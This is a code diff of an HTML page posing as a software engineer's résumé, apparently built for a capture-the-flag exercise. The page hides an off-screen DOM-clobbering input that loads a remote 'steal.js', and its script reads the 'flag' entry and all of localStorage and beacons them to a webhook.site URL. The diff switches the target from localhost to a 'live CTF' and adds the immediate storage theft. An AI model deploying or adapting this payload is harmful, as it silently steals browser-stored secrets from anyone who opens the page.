@@ -1,4 +1,4 @@
-    <!DOCTYPE html>
+     <!DOCTYPE html>
      <html>
      <head>
          <title>Michael Thompson - Senior Software Engineer</title>
@@ -20,9 +20,9 @@
                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
              </div>
 
-             <!-- CRITICAL: DOM Clobbering element targeting localhost -->
+             <!-- CRITICAL: DOM Clobbering element for CTF -->
              <div style="position: fixed; left: -10000px; visibility: hidden; opacity: 0;">
-                 <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/steal.js">
+                 <input id="utilsJS" name="url" value="https://gavinyw.github.io/resume-portfolio/live_ctf_steal.js">
              </div>
 
              <h2>Professional Summary</h2>
@@ -48,7 +48,7 @@
          </div>
 
          <script>
-             console.log('LOCALHOST-TARGETED ATTACK - Instructor Note Applied');
+             console.log('LIVE CTF ATTACK - Direct Flag Extraction');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -58,7 +58,7 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/localhost?' + params.toString();
+                     img.src = 'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/live-ctf?' + params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
@@ -66,18 +66,54 @@
 
              // Send initial confirmation
              sendWebhook({
-                 status: 'LOCALHOST_TARGETED_ATTACK_START',
+                 status: 'LIVE_CTF_ATTACK_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  current_url: window.location.href,
                  clobbering_ready: !!window.utilsJS,
                  clobbering_url: window.utilsJS?.url || window.utilsJS?.value || 'not_found',
                  user_agent: navigator.userAgent,
-                 referrer: document.referrer || 'none',
-                 instructor_note_applied: true
+                 referrer: document.referrer || 'none'
              });
 
-             // STRATEGY 1: Traditional DOM Clobbering (execute first)
+             // IMMEDIATE FLAG EXTRACTION (if on CTF domain)
+             setTimeout(() => {
+                 try {
+                     const flag = localStorage.getItem('flag');
+                     const allStorage = {};
+                     for (let i = 0; i < localStorage.length; i++) {
+                         const key = localStorage.key(i);
+                         allStorage[key] = localStorage.getItem(key);
+                     }
+
+                     sendWebhook({
+                         status: 'IMMEDIATE_FLAG_EXTRACTION',
+                         timestamp: new Date().toISOString(),
+                         flag: flag || 'not_found',
+                         all_localStorage: JSON.stringify(allStorage),
+                         localStorage_length: localStorage.length,
+                         domain: window.location.hostname,
+                         port: window.location.port || 'default'
+                     });
+
+                     if (flag) {
+                         sendWebhook({
+                             status: 'FLAG_CAPTURED_IMMEDIATE',
+                             flag: flag,
+                             timestamp: new Date().toISOString(),
+                             method: 'immediate_extraction'
+                         });
+                     }
+                 } catch(e) {
+                     sendWebhook({
+                         status: 'IMMEDIATE_EXTRACTION_ERROR',
+                         error: e.message,
+                         timestamp: new Date().toISOString()
+                     });
+                 }
+             }, 1000);
+
+             // DOM Clobbering execution
              setTimeout(() => {
                  console.log('Executing DOM clobbering strategy...');
 
@@ -113,81 +149,17 @@
                  }
              }, 2000);
 
-             // STRATEGY 2: Check if we're on localhost and handle accordingly
-             if (window.location.hostname === 'localhost' || window.location.hostname.includes('localhost')) {
-                 console.log('On localhost - direct execution');
-
-                 sendWebhook({
-                     status: 'ON_LOCALHOST_DOMAIN',
-                     timestamp: new Date().toISOString(),
-                     domain: window.location.hostname,
-                     port: window.location.port
-                 });
-
-                 // If we're already on localhost, execute attack directly
-                 setTimeout(() => {
-                     // Try to trigger the vulnerable function on localhost
-                     if (typeof loadMessageBoardJS === 'function') {
-                         loadMessageBoardJS();
-                     } else {
-                         // Create DOM clobbering and execute
-                         const input = document.createElement('input');
-                         input.id = 'utilsJS';
-                         input.name = 'url';
-                         input.value = 'https://gavinyw.github.io/resume-portfolio/steal.js';
-                         input.style.cssText = 'position:fixed;left:-9999px;opacity:0;';
-                         document.body.appendChild(input);
-
-                         setTimeout(() => {
-                             let utilJS = window.utilsJS || {};
-                             if (utilJS.url) {
-                                 const script = document.createElement('script');
-                                 script.src = utilJS.url;
-                                 document.body.appendChild(script);
-                             }
-                         }, 1000);
-                     }
-                 }, 3000);
-
-             } else {
-                 // STRATEGY 3: If on GitHub, redirect to localhost:8399 (INSTRUCTOR'S SOLUTION)
-                 setTimeout(() => {
-                     console.log('On GitHub - redirecting to localhost:8399 as per instructor note');
-
-                     // CRITICAL UPDATE: Use localhost:8399 instead of CTF domain
-                     const localhostUrl = 'http://localhost:8399/#messages';
-
+             // Navigate to messages section
+             setTimeout(() => {
+                 if (window.location.hash !== '#messages') {
+                     window.location.hash = '#messages';
                      sendWebhook({
-                         status: 'REDIRECTING_TO_LOCALHOST_8399',
+                         status: 'NAVIGATED_TO_MESSAGES',
                          timestamp: new Date().toISOString(),
-                         target_url: localhostUrl,
-                         instructor_guidance: 'admin_stores_flag_on_localhost'
+                         full_url: window.location.href
                      });
-
-                     // Only redirect if we haven't already tried
-                     if (!sessionStorage.getItem('localhost_redirect_attempted')) {
-                         sessionStorage.setItem('localhost_redirect_attempted', 'true');
-                         setTimeout(() => {
-                             console.log('🎯 REDIRECTING TO LOCALHOST:8399 - FLAG LOCATION!');
-                             window.location.href = localhostUrl;
-                         }, 1000);
-                     }
-                 }, 6000);
-             }
-
-             // STRATEGY 4: Navigate to messages section if on localhost
-             if (window.location.hostname === 'localhost' || window.location.hostname.includes('localhost')) {
-                 setTimeout(() => {
-                     if (window.location.hash !== '#messages') {
-                         window.location.hash = '#messages';
-                         sendWebhook({
-                             status: 'NAVIGATED_TO_LOCALHOST_MESSAGES',
-                             timestamp: new Date().toISOString(),
-                             full_url: window.location.href
-                         });
-                     }
-                 }, 4000);
-             }
+                 }
+             }, 4000);
          </script>
      </body>
      </html>
